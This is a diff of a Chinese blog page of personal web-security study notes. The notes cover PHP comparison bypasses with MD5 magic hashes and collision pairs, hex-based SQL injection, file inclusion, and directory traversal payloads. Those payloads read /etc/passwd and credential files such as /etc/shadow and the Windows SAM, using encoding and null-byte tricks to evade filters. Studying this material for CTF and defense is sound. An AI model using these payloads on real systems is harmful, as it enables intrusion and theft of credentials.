@@ -18,7 +18,7 @@
 <meta property="og:description" content="就是刚接触Web的水平，大佬们可以离开了，怕咱太菜了，大佬们看不下去了（">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-05-20T02:54:23.000Z">
-<meta property="article:modified_time" content="2024-05-21T13:06:47.844Z">
+<meta property="article:modified_time" content="2024-05-29T17:06:40.014Z">
 <meta property="article:author" content="9C±Void">
 <meta property="article:tag" content="Web">
 <meta property="article:tag" content="笔记">
@@ -235,7 +235,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">1.4k字</span>
+      <span class="post-count">7.3k字</span>
     </span>
   </span>
 
@@ -244,7 +244,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">6分</span>
+      <span class="post-count">29分</span>
     </span>
   </span>
 </div>
@@ -259,27 +259,27 @@
 <span id="more"></span>
 
 <hr>
-<p>这篇不算博客，主要是给我自己做笔记用的，不会考虑任何排版和分类，我自己看得懂就行</p>
+<p>这篇不算博客，主要是给我自己做笔记用的，不会考虑任何排版和分类，我自己看得懂就行，而且很多都是抄的，各位自己搜一下就知道我抄的哪篇了（</p>
 <h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="1-各种比较（强弱比较，其它比较函数和方法）"><a href="#1-各种比较（强弱比较，其它比较函数和方法）" class="headerlink" title="1. 各种比较（强弱比较，其它比较函数和方法）"></a>1. 各种比较（强弱比较，其它比较函数和方法）</h2><ol>
 <li><p>PHP中的弱比较使用的是<code>==</code>，要求参数<strong>值相同</strong>，若两个参数数据类型不同，会尝试将其中一个转换为另一个数据的类型<br>e.g.</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 字符串以数字开头时，以开头数字（到字母出现截止）作为转换结果；开头不是数字的字符串或空（null），则转换为0</span></span><br><span class="line"><span class="string">&#x27;12&#x27;</span>==<span class="number">12</span>    <span class="comment">//true</span></span><br><span class="line"><span class="string">&#x27;12abc&#x27;</span>==<span class="number">12</span> <span class="comment">//true</span></span><br><span class="line"><span class="string">&#x27;adm2n&#x27;</span>==<span class="number">0</span>  <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 布尔值true和任意字符串都相等，除了0</span></span><br><span class="line"><span class="string">&#x27;way&#x27;</span>==<span class="literal">true</span>    <span class="comment">//true</span></span><br><span class="line"><span class="string">&#x27;false&#x27;</span>==<span class="literal">true</span>  <span class="comment">//true</span></span><br><span class="line"><span class="number">234</span>==<span class="literal">true</span>      <span class="comment">//true</span></span><br><span class="line"><span class="number">0</span>==flase       <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 当字符串被当作一个数值来处理时，如果该字符串没有包含’.’,‘e’,&#x27;E’并且其数值在整形的范围之内，该字符串作为int来取值，其他所有情况下都被作为float来取值，并且字符串开始部分决定它的取值，开始部分为数字，则其值就是开始的数字，否则，其值为0</span></span><br><span class="line"><span class="comment">// 因此当hash开头为0e后全为数字的话，进行比较时就会将其当做科学计数法来计算，用计算出的结果来进行比较</span></span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$str1</span>)=<span class="number">0e420233178946742799316739797882</span></span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$str2</span>) == <span class="string">&#x27;0&#x27;</span>	<span class="comment">//true</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 字符串以数字开头时，以开头数字（到字母出现截止）作为转换结果；开头不是数字的字符串或空（null），则转换为0</span></span><br><span class="line"><span class="string">&#x27;12&#x27;</span>==<span class="number">12</span>    <span class="comment">//true</span></span><br><span class="line"><span class="string">&#x27;12abc&#x27;</span>==<span class="number">12</span> <span class="comment">//true</span></span><br><span class="line"><span class="string">&#x27;adm2n&#x27;</span>==<span class="number">0</span>  <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 布尔值true和任意字符串都相等，除了0</span></span><br><span class="line"><span class="string">&#x27;way&#x27;</span>==<span class="literal">true</span>    <span class="comment">//true</span></span><br><span class="line"><span class="string">&#x27;false&#x27;</span>==<span class="literal">true</span>  <span class="comment">//true</span></span><br><span class="line"><span class="number">234</span>==<span class="literal">true</span>      <span class="comment">//true</span></span><br><span class="line"><span class="number">0</span>==<span class="literal">false</span>       <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 当字符串被当作一个数值来处理时，如果该字符串没有包含’.’,‘e’,&#x27;E’并且其数值在整形的范围之内，该字符串作为int来取值，其他所有情况下都被作为float来取值，并且字符串开始部分决定它的取值，开始部分为数字，则其值就是开始的数字，否则，其值为0</span></span><br><span class="line"><span class="comment">// 因此当hash开头为0e后全为数字的话，进行比较时就会将其当做科学计数法来计算，用计算出的结果来进行比较</span></span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$str1</span>)=<span class="number">0e420233178946742799316739797882</span></span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$str2</span>) == <span class="string">&#x27;0&#x27;</span>	<span class="comment">//true</span></span><br></pre></td></tr></table></figure>
 
 <p>一般的绕过就是像上面举的例子一样，让两个数据值一样就行</p>
 <p>这里添加一些MD5的值开头是0e的字符串：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">240610708:0e462097431906509019562988736854</span><br><span class="line">QLTHNDT:0e405967825401955372549139051580</span><br><span class="line">QNKCDZO:0e830400451993494058024219903391</span><br><span class="line">PJNPDWY:0e291529052894702774557631701704</span><br><span class="line">NWWKITQ:0e763082070976038347657360817689</span><br><span class="line">NOOPCJF:0e818888003657176127862245791911</span><br><span class="line">MMHUWUV:0e701732711630150438129209816536</span><br><span class="line">MAUXXQC:0e478478466848439040434801845361</span><br></pre></td></tr></table></figure>
 
-
+<p><strong>重要！</strong>：字符串<code>0e215962017</code>的MD5值为<code>0e291242476940776845150308577824</code>，能够满足<code>$value == md5($value)</code>！！！</p>
 </li>
 <li><p>PHP中强比较使用的是<code>===</code>，要求参数<strong>不仅值相同，类型也必须相同</strong>才返回true<br>一般强比较没有很好的绕过方法，但是如果存在<code>md5($str1) === md5($str2)</code>的时候，我们就可以找到一些不相同但是MD5值相同的字符串进行绕过，下面给出一些符合条件的字符串对：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Pair 1</span></span><br><span class="line">a=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">00</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%<span class="number">55</span>%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2</span><br><span class="line">b=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">02</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%d5%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2</span><br><span class="line"></span><br><span class="line"><span class="comment">// Pair 2</span></span><br><span class="line">a=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line">b=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line"></span><br><span class="line"><span class="comment">// Pair 3</span></span><br><span class="line">a=<span class="number">0e306561559</span>aa787d00bc6f70bbdfe3404cf03659e704f8534c00ffb659c4c8740cc942feb2da115a3f4155cbb8607497386656d7d1f34a42059d78f5a8dd1ef</span><br><span class="line">b=<span class="number">0e306561559</span>aa787d00bc6f70bbdfe3404cf03659e744f8534c00ffb659c4c8740cc942feb2da115a3f415dcbb8607497386656d7d1f34a42059d78f5a8dd1ef</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Pair 1</span></span><br><span class="line">a=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">00</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%<span class="number">55</span>%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2</span><br><span class="line">b=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">02</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%d5%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2</span><br><span class="line"></span><br><span class="line"><span class="comment">// Pair 2</span></span><br><span class="line">a=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line">b=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br></pre></td></tr></table></figure>
 
-<p>上面的方法是强碰撞，可以用于传入的参数必须是字符串的强比较（Pair 3除外），比如下面的例子：</p>
+<p>上面的方法是强碰撞，可以用于传入的参数必须是字符串的强比较，比如下面的例子：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]!==(<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>而如果参数不要求是字符串，比如下面的例子：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]&amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>那么我们可以传入两个数组，这样<code>md5()</code>不会报错，返回值是<code>null</code>，而强比较中<code>null===null</code>返回值是<code>true</code></p>
+<p>那么我们可以<strong>传入两个数组</strong>，这样<code>md5()</code>不会报错，返回值是<code>null</code>，而强比较中<code>null===null</code>返回值是<code>true</code></p>
 </li>
 <li><p>PHP中存在一个字符串比对的函数<code>strcmp($str1, $str2)</code>，返回值如下：</p>
 </li>
@@ -311,7 +311,357 @@
    <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 作用：判断参数s是否为数字，是则返回数字，不是则返回0，然后带入数据库查询</span></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]:<span class="number">0</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;insert into test(type)values(<span class="subst">$s</span>);&quot;</span>;  <span class="comment">//是 values($s) 不是values(&#x27;$s&#x27;)</span></span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
 
 <p>   如果我们传入字符串”1 or 1”的Hex，也就是<code>0x31206f722031</code>的话，就可能导致SQL注入</p>
-<h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1>
+<h2 id="2-文件包含"><a href="#2-文件包含" class="headerlink" title="2. 文件包含"></a>2. 文件包含</h2><p>有的时候服务端会让用户选择包含的文件，但是开发人员没有对要包含的文件进行保护，最后导致攻击者通过修改文件的位置让后台执行任意文件</p>
+<p>常用的PHP文件包含函数有下面几种：</p>
+<ul>
+<li><code>require()</code>：找不到被包含的文件会产生致命错误，并停止脚本运行</li>
+<li><code>include()</code>：找不到被包含的文件只会产生警告，脚本继续执行</li>
+<li><code>require_once()</code>：同<code>require()</code>，但如果该文件代码已经被包含，则不会再次包含</li>
+<li><code>include_once()</code>：同<code>include()</code>，但如果该文件代码已经被包含，则不会再次包含</li>
+</ul>
+<p><code>include()</code>函数所包含的文件只要有PHP代码，都会被解析出来，<strong>无视文件类型</strong></p>
+<h3 id="2-1-本地文件包含（LFI）"><a href="#2-1-本地文件包含（LFI）" class="headerlink" title="2.1 本地文件包含（LFI）"></a>2.1 本地文件包含（LFI）</h3><p>能够打开并包含本地文件的漏洞被称为本地文件包含漏洞，比如下面的代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过这个<code>include()</code>，我们能够读取一些PHP文件，但我们同时可以读取一些敏感文件，比如假如服务端环境是Windows，那么我们可以读取诸如<code>system.ini</code>这样的文件，可以通过<strong>绝对路径和相对路径</strong>读取，也就是下面的两种URL：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/include.php?filename=C:\Windows\system.ini</span><br><span class="line">127.0.0.1/include.php?filename=../../Windows/system.ini</span><br></pre></td></tr></table></figure>
+
+<p><del>猜想后者使用的相对路径可能会和目录穿越配合使用…？</del></p>
+<h4 id="2-1-1-常见的敏感文件"><a href="#2-1-1-常见的敏感文件" class="headerlink" title="2.1.1 常见的敏感文件"></a>2.1.1 常见的敏感文件</h4><ul>
+<li>Windows系统<ul>
+<li>C:\boot.ini：查看系统版本</li>
+<li>C:\Windows\system32\inetsrv\MetaBase.xml：IIS配置文件</li>
+<li>C:\Windows\repair\sam：存储Windows系统初次安装的密码</li>
+<li>C:\ProgramFiles\mysql\my.ini：Mysql配置</li>
+<li>C:\ProgramFiles\mysql\data\mysql\user.MYD：MySQL root密码</li>
+<li>C:\Windows\php.ini：php配置信息</li>
+</ul>
+</li>
+<li>Linux&#x2F;Unix系统<ul>
+<li>&#x2F;etc&#x2F;password：账户信息</li>
+<li>&#x2F;etc&#x2F;shadow：账户密码信息</li>
+<li>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf：Apache2默认配置文件</li>
+<li>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf：虚拟网站配置</li>
+<li>&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini：PHP相关配置</li>
+<li>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf：Apache配置文件</li>
+<li>&#x2F;etc&#x2F;my.conf ：mysql配置文件</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-1-2-目录穿越漏洞"><a href="#2-1-2-目录穿越漏洞" class="headerlink" title="2.1.2 目录穿越漏洞"></a>2.1.2 目录穿越漏洞</h4><p>我确实不清楚这个该放哪里，反正刚刚提及了，干脆这里就写了好了<del>（好困，不想动脑）</del></p>
+<p>目录穿越漏洞可能导致攻击者读取运行应用程序的服务器的任意文件，而且有些情况攻击者可能能在服务器写入任意文件</p>
+<p>通常出现在前端通过文件名请求服务器上的文件的时候，大多情况使用的方法是GET，比如<code>GET /image?filename=2.png</code>这样的情况，这就导致攻击者可以读取服务器上的任意文件</p>
+<ol>
+<li>最简单的情况就直接使用<code>../</code>返回上一级，比如图像映射在<code>/var/www/images</code>里，那么就<code>GET filename=../../../etc/passwd</code>就可以了</li>
+<li>有的时候网站会过滤<code>../</code>这样的关键字，所以我们可以采用绝对路径<code>GET filename=/etc/passwd</code>，不使用<code>../</code>返回上一级目录遍历</li>
+<li>有的时候网站会把<code>../</code>替换为空，所以可以使用复写操作：<code>GET filename=....//....//....//etc/passwd</code>，在经过替换后就和情况1里面的一样了</li>
+<li>有的时候还可以使用URL编码绕过服务器对<code>.</code>和<code>/</code>的检测，使用<code>%2e</code>代替<code>.</code>,<code>%2f</code>代替<code>/</code>，<code>%25</code>代替<code>%</code>，一般代替<code>%</code>是因为双重URL编码，比如这样：<code>GET filename=%252e%252e%252f%252e%252e%252f%252e%252e%252e%252fetc%252fpasswd</code>就是利用双重URL编码绕过检测的一个情况</li>
+<li>有的时候前端获取文件的时候会检查所请求的路径是否是以一个固定的路径开头，比如固定开头为<code>/var/www/images</code>，此时我们可以讲绝对路径配合<code>../</code>进行绕过，比如<code>GET filename=/var/www/iamges/../../../etc/passwd</code>，这样我们就可以绕过检测</li>
+<li>更常见的情况，前端对请求的文件类型进行了限制，比如要求请求的文件后缀一定是诸如<code>.png</code>啊 <code>.jpg</code>啊这样的图片，这时我们可以利用<code>%00</code>进行截断，比如<code>GET filename=../../../etc/passwd%00.jpg</code>，此时我们就绕过了文件后缀检测</li>
+</ol>
+<h3 id="2-2-远程文件包含（RFI）"><a href="#2-2-远程文件包含（RFI）" class="headerlink" title="2.2 远程文件包含（RFI）"></a>2.2 远程文件包含（RFI）</h3><h2 id="3-PHP伪协议"><a href="#3-PHP伪协议" class="headerlink" title="3. PHP伪协议"></a>3. PHP伪协议</h2><p>PHP支持的伪协议有以下这些：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure>
+
+<p>一般用于命令执行的有下面这些伪协议：</p>
+<h3 id="3-1-file-协议"><a href="#3-1-file-协议" class="headerlink" title="3.1 file://协议"></a>3.1 <code>file://</code>协议</h3><p>该协议为PHP使用的默认封装协议，一般用于<strong>读取本地文件</strong>，且不受<code>allow_url_fopen</code>和<code>allow_url_include</code>的影响</p>
+<p>一般使用有3种方法：</p>
+<ul>
+<li><p><strong>file:&#x2F;&#x2F;[文件绝对路径与文件名]</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>文件相对路径与文件名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=./phpinfo.txt</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>http:&#x2F;&#x2F;[网络路径和文件名]</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="3-2-php-协议"><a href="#3-2-php-协议" class="headerlink" title="3.2 php://协议"></a>3.2 <code>php://</code>协议</h3><p>用于访问各个输入&#x2F;输出流，常用的是<code>php://filter</code>和<code>php://input</code>，前者用于<strong>读取源码</strong>，后者用于<strong>执行PHP代码</strong></p>
+<p>该伪协议不受<code>allow_url_fopen</code>影响，但是对于<code>php://input</code>，<code>php://stdin</code>，<code>php://memory</code>和<code>php://temp</code>需要<code>allow_url_include</code>为on，其它的不受影响</p>
+<p>以下是一些<code>php://</code>协议：</p>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>php://input</code></td>
+<td>可以访问请求的原始数据中的只读流，POST请求中访问其<code>data</code>部分，但当<code>enctype=&quot;multipart/form-data&quot;</code>时该协议无效</td>
+</tr>
+<tr>
+<td><code>php://output</code></td>
+<td>只写的数据流，允许以<code>print</code>和<code>echo</code>一样的方式写入到输出缓冲区</td>
+</tr>
+<tr>
+<td><code>php://fd</code></td>
+<td>（版本&gt;&#x3D;5.3.6）允许直接访问指定的文件描述符</td>
+</tr>
+<tr>
+<td><code>php://memory</code>，<code>php://temp</code></td>
+<td>（版本&gt;&#x3D;5.1.0）一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致</td>
+</tr>
+<tr>
+<td><code>php://filter</code></td>
+<td>（版本&gt;&#x3D;5.0.0）一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器</td>
+</tr>
+</tbody></table>
